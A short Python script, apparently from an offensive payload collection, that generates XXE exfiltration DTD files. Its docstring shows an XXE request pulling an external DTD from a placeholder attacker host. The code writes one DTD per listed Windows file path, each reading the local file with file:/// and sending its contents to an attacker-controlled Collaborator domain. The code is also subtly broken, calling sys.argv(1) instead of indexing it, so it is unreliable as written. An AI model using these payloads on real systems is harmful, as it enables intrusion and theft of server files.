#Source files: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion/Intruders
#Usage: python xxe-generate.py Windows-files.txt burpcollaborator_domain_name
'''
Reference: https://gist.github.com/staaldraad/01415b990939494879b4
XXE Payload in HTTP request:
<?xml version="1.0" ?>
<!DOCTYPE r [
<!ELEMENT r ANY >
<!ENTITY % sp SYSTEM "http://PUBLIC_IP_OF_WEB_HOSTING_XML_FILES">
%sp;
%param1;
]>
<r>&exfil;</r>
'''
import sys
f=open(sys.argv(1),"r")
data = f.readlines()
i=1
for line in data:
     f2=open(str(i)+".xml","w")
     f2.write("<!ENTITY % data SYSTEM \"file:///"+line+"\">")
     f2.write("<!ENTITY % param1 \"<!ENTITY exfil SYSTEM 'http://"+str(sys.argv(2))+"/"+str(i)+"/?%data;'>\">")
     f2.close()
     i=i+1
f.close()